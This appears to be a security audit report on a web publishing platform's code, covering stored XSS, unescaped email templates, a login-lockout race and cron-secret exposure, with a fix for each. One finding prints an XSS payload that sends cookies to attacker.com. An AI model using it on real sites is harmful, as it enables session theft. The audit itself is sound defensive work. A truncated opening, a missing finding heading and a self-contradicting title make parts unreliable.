## src/lib/auth.ts

**Severity:** MEDIUM  
**Issue:** Lockout counter is in-memory and per-serverless-instance.  
**Detail:** `failedLoginAttempts` is stored in the DB (correct), but the decision to lock is

## Security Findings

### SEC-01 — CRITICAL: Stored XSS via article content rendering

**File:** `src/app/articles/[slug]/page.tsx` lines 159–239  
**Surface:** `nodeToHtml()` → `dangerouslySetInnerHTML`

`nodeToHtml()` renders text nodes without HTML escaping (`let text = node.text ?? ''` at line 171).
A text node containing `<script>alert(1)</script>` stored in the Tiptap JSON would be rendered
verbatim into `dangerouslySetInnerHTML={{ __html: htmlContent }}` at line 413.

Additionally, attribute values in `figure`, `image`, and `footnoteRef` nodes are interpolated
directly into HTML attribute strings without escaping:
- Line 197: `<img src="${src}" alt="${alt}" />` — a `"` in `alt` breaks out of the attribute
- Line 179: `href="${mark.attrs?.href ?? '#'}"` — `javascript:` URLs are accepted without sanitization
- Line 207: `title="${node.attrs?.content ?? ''}"` — footnote content breaks attribute boundary

**Fallback path:** Line 238: `return { html: content, footnotes: [] }` — if article content is
not valid JSON (or not a Tiptap doc), the raw `content` string is placed directly into
`dangerouslySetInnerHTML`. Any HTML stored in that field renders without sanitization.

Since only authenticated writers and editors can create articles, the immediate risk is
**stored XSS by a malicious insider**, or **via a compromised writer account**. Content is
not sanitized at write time (the Tiptap editor sanitizes on paste via `cleanPastedHTML.ts`,
but this only runs client-side and can be bypassed by hitting the API directly).

**Fix:** Escape text node content with an HTML entity encoder. Validate `href` against a
`javascript:` prefix deny-list. Sanitize the fallback HTML path with DOMPurify (server-side)
or reject non-JSON content at write time.

### SEC-02 — HIGH: Stored XSS in admin/moderation emails

**File:** `src/lib/email.ts` lines 54, 92, 106, 165  
**Surface:** Admin and writer email HTML bodies

Four email templates interpolate user-controlled or admin-entered content directly into HTML
without escaping:

| Function | Line | Unescaped input | Source |
|----------|------|-----------------|--------|
| `articleReturnedEmail` | 54 | `editorNote` | Editor input |
| `userWarningEmail` | 92 | `reason` | Admin input |
| `userBannedEmail` | 106 | `reason` | Admin input |
| `commentFlaggedEmail` | 165 | `commentExcerpt` | User comment body |

`commentFlaggedEmail` is the highest-risk path: a user can submit a comment containing
`<img src=x onerror="document.location='https://attacker.com?c='+document.cookie">` — the
filter flags it for review and triggers an email to the moderation team. The email client
renders the `onerror` handler in the admin's browser context, potentially stealing session
cookies or redirecting the admin.

`reason` in warning/ban emails is admin-entered, so the risk is self-inflicted XSS or
cross-admin manipulation (lower risk but not zero for multi-admin environments).

**Fix:** HTML-escape all dynamic values before interpolation. A minimal helper:
```typescript
function esc(s: string) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')
}
```
Apply to every `${}` interpolation inside HTML template literals in `email.ts`.

**Files:**

- `src/app/api/admin/users/[userId]/warn/route.ts` line 17
- `src/app/api/admin/users/[userId]/role/route.ts` line 34

In all three routes: `const adminName = adminId`. The UUID is stored in `adminName`, `issuedBy`,
and the admin-note text. Moderation logs are unreadable: "Role changed by `3f8a...`". If an
admin is removed and their ID reused (unlikely but possible), attribution is further obscured.

**Fix:** Fetch the admin's `name` from the session (`session.user.name`) rather than using the ID.

### SEC-04 — HIGH: Comment hide permanently destroys original body; unhide does not restore

**File:** `src/app/api/editorial/comments/[commentId]/route.ts` lines 34, 39  
(Also: `src/app/api/comments/[commentId]/route.ts` line 31)

HIDE action: `data: { isHidden: true, body: '[Comment removed]' }` — original text overwritten.  
UNHIDE action: `data: { isHidden: false }` — does not restore the body.

A comment that is hidden (even mistakenly) is permanently lost. There is no audit trail or
recovery path. Combined with the hard-delete path in the public comments route, the platform
has no way to reconstruct what a user said for legal/moderation review purposes.

**Fix:** Introduce a `originalBody` or `hiddenBody` column that preserves the text before
overwrite, or store comment edits/deletions in a separate `CommentHistory` table.

### SEC-05 — MEDIUM: bcrypt silently truncates passwords over 72 bytes

**File:** `src/app/api/auth/forgot-password/route.ts` lines 68–70  
**Counterpart:** `src/app/api/auth/signup/route.ts` line 20 (enforces 128-char max)

`bcryptjs` silently truncates input to 72 bytes. The signup route enforces `password.length <= 128`
(line 20), but the password-reset PATCH only checks `password.length < 8` (line 70). A user who
resets their password with a 128–200 character string will have a password that bcrypt truncates
to 72 bytes — any password sharing the same first 72 bytes will also authenticate. This is an
existing bcrypt limitation but should be guarded consistently.

**Fix:** Add `if (password.length > 128) return 400` to the PATCH handler to match signup policy.

### SEC-06 — MEDIUM: In-memory login lockout is per-process; distributed bypass possible

**File:** `src/lib/auth.ts` lines 155–165  
**Context:** Vercel serverless / multiple Node processes

The lockout decision reads a DB counter (`LoginAttempt` table) and compares against the limit.
However, the check-and-increment is not atomic: `findMany` count → compare → `create` are three
sequential DB calls with no transaction or DB-level lock. Under concurrent requests hitting
different cold-start instances, an attacker can submit 5 × N attempts (where N = instance count)
before any single instance sees a full 5-count block.

For a credential-stuffing attack in a low-traffic window this provides a real bypass window.

**Fix:** Replace the three-step check with a single atomic DB operation: `INSERT ... ON CONFLICT DO UPDATE SET count = count + 1 RETURNING count` and block when the returned count exceeds the limit. Alternatively use a distributed lock (Redis/Supabase advisory lock).

### SEC-07 — MEDIUM: Anonymous vote deduplication relies solely on cookies

**File:** `src/app/api/debates/[debateId]/vote/route.ts` line 73  
**Setting:** `sameSite: 'lax'`, no IP-based fallback

A user can submit a second anonymous vote by clearing cookies or using a private window.
The cookie is set with `httpOnly` and `secure` correctly, but cookie deletion is trivially easy.
Authenticated users are correctly deduplicated via DB (`DebateVote` unique constraint on `userId +
debateId`), but anonymous votes have no such guarantee.

**Fix:** Log the IP for anonymous votes (with appropriate privacy disclosures) and enforce
one-vote-per-IP for anonymous users. Alternatively, gate debate voting on authentication.

### SEC-08 — MEDIUM: `article_comments` raw SQL confirms parameterisation is correct

**File:** `src/app/api/articles/[id]/comments/route.ts` lines 24–40, 66–87

The raw `$queryRaw` template literal uses Prisma's parameterised interpolation (`${id}`,
`${session.user.id}`, `${body.commentText.trim()}`) — this is safe; Prisma sends these as
prepared-statement parameters, not string concatenation. **SQL injection is not present here.**

However the table itself is not in the Prisma schema (see CRITICAL finding in schema section),
so the migration status is the primary risk, not injection.

### SEC-09 — MEDIUM: `cron` secret exposed in access logs via query param

**File:** `src/app/api/publish-scheduled/route.ts` lines 41–43

The route accepts `?secret=<CRON_SECRET>` as an alternative to the `Authorization: Bearer` header.
Vercel, CDN, and Next.js access logs record full request URLs including query parameters.
The secret appears in plaintext in any log aggregator (Datadog, Papertrail, Vercel log drains).

**Fix:** Remove the query-param path. Use only `Authorization: Bearer` which is not logged.

### SEC-10 — LOW: `rate-limit.ts` Map grows without bound

**File:** `src/lib/rate-limit.ts`  
No cleanup interval. In a long-lived process (local dev, self-hosted), the `store` Map
accumulates one entry per unique IP/key forever. `rate-limiter.ts` has a 5-minute prune loop;
`rate-limit.ts` does not.

**Fix:** Copy the `setInterval` cleanup from `rate-limiter.ts` into `rate-limit.ts`, or
consolidate to a single module.

### SEC-11 — LOW: `sendEmail` failures are silently swallowed

**File:** `src/lib/email.ts` lines 23–32

Missing `RESEND_API_KEY` returns `undefined` (no throw). Network errors are caught and logged
but not re-thrown. All call sites use fire-and-forget (`await sendEmail(...)`), so a failed
ban email, password-reset email, or publish notification produces no observable signal to the
caller or user. Critical moderation actions (ban, warn) can succeed in DB while the notified
party receives nothing.

**Fix:** Return `{ ok: boolean; error?: string }` from `sendEmail`. Call sites for
critical operations (ban, warn, password-reset) should log or surface the failure.

### SEC-12 — LOW: `CRON_SECRET` strength not validated at startup

**File:** `src/app/api/publish-scheduled/route.ts` lines 37–40  
If `CRON_SECRET` is missing or an empty string, the check `secret !== process.env.CRON_SECRET`
is `'' !== ''` = `false` — the check passes and the endpoint is unprotected. A startup
assertion would catch misconfiguration early.
